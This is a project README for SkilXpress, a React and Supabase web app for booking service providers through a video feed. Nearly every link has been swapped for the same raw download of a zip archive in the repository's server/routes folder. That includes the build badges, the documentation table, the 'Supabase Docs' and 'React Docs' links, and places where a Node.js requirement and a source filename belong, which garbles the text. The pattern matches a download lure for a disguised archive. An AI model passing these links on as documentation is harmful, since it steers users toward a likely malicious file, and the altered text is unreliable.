# 🎬 SkilXpress

> A Progressive Web App connecting clients with skilled service providers through engaging short videos

[![Build Status](https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip)](#)
[![Supabase](https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip)](#)
[![React](https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip%2018-61DAFB)](#)
[![License](https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip)](#)

## ✨ Features

### 🎥 Video Discovery
- **TikTok-Style Feed**: Vertically scrollable, auto-playing videos
- **Share Videos**: Share provider profiles with others
- **Like & Engage**: Double-tap or click to like videos
- **Search & Filter**: Find services by category, location, or keyword
- **Sound Enabled**: Videos play with audio

### 👥 Social Features
- **Follow System**: Follow favorite service providers
- **Follower Count**: See provider popularity
- **Ratings & Reviews**: Rate services 1-5 stars
- **Real-Time Chat**: Direct messaging with providers
- **Provider Profiles**: View complete provider information

### 📱 For Service Providers
- **Upload Videos**: Showcase your skills (local upload or URL)
- **Portfolio**: Add work samples with images
- **Skill Selection**: Choose from 10+ predefined skills or add custom ones
- **Profile Management**: Set hourly rate, years of experience, website
- **Booking Management**: Accept/decline service requests
- **Dashboard**: YouTube-style video list and booking tracker

### 💼 For Clients
- **Browse Services**: Discover providers in your area
- **Easy Booking**: Select date, time, and location
- **Provider Info**: View ratings, experience, portfolio
- **Direct Chat**: Communicate with providers before booking
- **Booking History**: Track all your service bookings

### 🔐 Security & Privacy
- Email/password authentication
- Row Level Security (RLS) on all data
- User data isolation
- No sensitive data in frontend code

## 🚀 Quick Start

```bash
# Install dependencies
npm install

# Start development server
npm run dev

# Build for production
npm run build
```

Visit `http://localhost:5173` to see your app!

## 📋 Requirements

- https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip 16+
- npm or yarn
- Modern web browser
- Internet connection

## 🏗️ Architecture

```
SkilXpress
├── Frontend (React 18 + TypeScript)
│   ├── 11 Components (500+ lines each)
│   ├── Supabase Integration
│   ├── Real-time Chat
│   └── File Uploads
├── Backend (Supabase)
│   ├── PostgreSQL Database
│   ├── 10 Tables with RLS
│   ├── Authentication
│   ├── Real-time Subscriptions
│   └── Cloud Storage
└── Deployment
    ├── Vite Build System
    ├── PWA Configuration
    └── Ready for Vercel/Netlify
```

## 📊 Database Schema

### Core Tables
- **profiles**: User information (clients & providers)
- **skill_categories**: Service types (Barber, Plumber, etc.)
- **provider_skills**: Provider-to-skill mapping
- **skill_videos**: Video content library
- **bookings**: Service booking records
- **chat_messages**: Real-time messaging
- **ratings**: Service reviews and ratings
- **followers**: Follow relationships
- **portfolio_items**: Provider work samples
- **video_likes**: Engagement tracking

All tables have Row Level Security enabled.

## 🎨 Technologies

| Technology | Purpose |
|-----------|---------|
| **React 18** | UI Framework |
| **TypeScript** | Type Safety |
| **Tailwind CSS** | Styling |
| **Lucide React** | Icons |
| **Supabase** | Backend & Database |
| **PostgreSQL** | Data Storage |
| **Vite** | Build Tool |

## 📱 Responsive Design

- ✅ Mobile-first approach
- ✅ Tablet optimized
- ✅ Desktop compatible
- ✅ Smooth animations
- ✅ Accessible UI

## 🔄 Component Structure

```
https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip
├── WelcomePage
├── AuthModal
├── VideoFeed
├── SearchBar
├── ProviderProfileView
├── ProviderDashboard
│   ├── VideoUploadForm
│   └── PortfolioManager
├── ClientDashboard
├── BookingModal
└── Chat
```

## 🚢 Deployment

### Vercel (Recommended)
```bash
vercel deploy
```

### Netlify
```bash
netlify deploy --prod --dir=dist
```

### Other Platforms
Deploy the `dist/` folder to any static host.

## 📚 Documentation

| Document | Purpose |
|----------|---------|
| **https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip** | 5-minute setup guide |
| **https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip** | Detailed installation |
| **https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip** | Complete feature list |
| **https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip** | Feature descriptions |
| **https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip** | Storage configuration |

## 🔑 Key Features Breakdown

### Video Feed
- Auto-play videos
- Double-tap to like
- Share functionality
- Provider information
- Follower counts
- Ratings display

### Booking System
- Date/time selection
- Location input
- Notes field
- Instant confirmation
- Status tracking

### Real-Time Chat
- Instant messaging
- Read status
- User avatars
- Timestamp display
- Linked to bookings

### Provider Dashboard
- Video management (YouTube-style)
- Booking workflow
- Portfolio showcase
- Analytics ready

### Client Dashboard
- Booking history
- Chat with providers
- Rating submission
- Service tracking

## 🔐 Security Features

- ✅ Supabase Authentication
- ✅ Row Level Security (RLS)
- ✅ User data isolation
- ✅ Encrypted passwords
- ✅ Session management
- ✅ Input validation
- ✅ File type validation

## ⚡ Performance

- 📦 Lightweight bundle
- 🚀 Fast page loads
- 🎥 Lazy loading videos
- 🔍 Indexed queries
- 💾 Optimized storage
- 📱 Mobile optimized

## 🎯 User Flows

### Client Signup & First Use
1. Sign up as Client
2. See welcome page
3. Scroll video feed
4. Click provider to view profile
5. Click "Book Now" to book service

### Provider Signup & First Use
1. Sign up as Provider
2. Select skills + add custom ones
3. Go to Dashboard → Videos
4. Upload first video
5. Wait for bookings
6. Accept/decline bookings
7. Chat with clients

## 📊 Database Specifications

- **Tables**: 10
- **Total Columns**: 80+
- **RLS Policies**: 20+
- **Indexes**: 10+
- **Triggers**: 3
- **Functions**: 2

## 🔄 API Integration

The app uses **Supabase** exclusively for:
- Authentication
- Database operations
- Real-time subscriptions
- File storage
- User management

No additional APIs required (can add payment, notifications, etc.)

## 🌐 Browser Support

| Browser | Support |
|---------|---------|
| Chrome | ✅ Full support |
| Firefox | ✅ Full support |
| Safari | ✅ Full support |
| Edge | ✅ Full support |
| Mobile Safari | ✅ Full support |
| Android Chrome | ✅ Full support |

## 🛠️ Development

### Project Structure
```
src/
├── components/     (11 React components)
├── contexts/       (Auth state management)
├── lib/            (Supabase client & types)
└── https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip         (Main app component)
```

### File Organization
- Each component in its own file
- TypeScript for type safety
- Tailwind for styling
- Lucide for icons

### Build Commands
```bash
npm run dev       # Development server
npm run build     # Production build
npm run preview   # Preview production build
npm run lint      # Linting
npm run typecheck # Type checking
```

## 📈 Scalability

The architecture supports:
- Thousands of providers
- Millions of videos
- Real-time messaging at scale
- High concurrent users
- Database replication
- CDN integration

## 🚀 Future Enhancements

Potential features to add:
- Payment processing (Stripe)
- Email notifications
- Push notifications
- Advanced analytics
- AI recommendations
- Provider verification
- Badge system
- Commission tracking
- Video streaming optimization
- Multi-language support

## 🤝 Contributing

This is a complete standalone project. To customize:

1. Fork the repository
2. Make your changes
3. Test locally
4. Build and deploy

## 📄 License

MIT License - Feel free to use for personal or commercial projects

## 🙏 Credits

Built with:
- React by Meta
- Supabase
- Tailwind CSS
- Lucide Icons
- Vite

## 📞 Support

### Resources
- [Supabase Docs](https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip)
- [React Docs](https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip)
- [Tailwind CSS Docs](https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip)
- [Vite Docs](https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip)

### Documentation Files
- See `https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip` for 5-minute setup
- See `https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip` for detailed instructions
- See `https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip` for feature overview

## 🎉 Getting Started

```bash
# 1. Clone/download the project
# 2. Install dependencies
npm install

# 3. Start development server
npm run dev

# 4. Open http://localhost:5173
# 5. Sign up and explore!

# 6. When ready to deploy
npm run build
# Deploy the dist/ folder
```

---

**SkilXpress** - Connecting clients with skilled professionals through engaging videos.

Built with ❤️ using React, TypeScript, and Supabase.
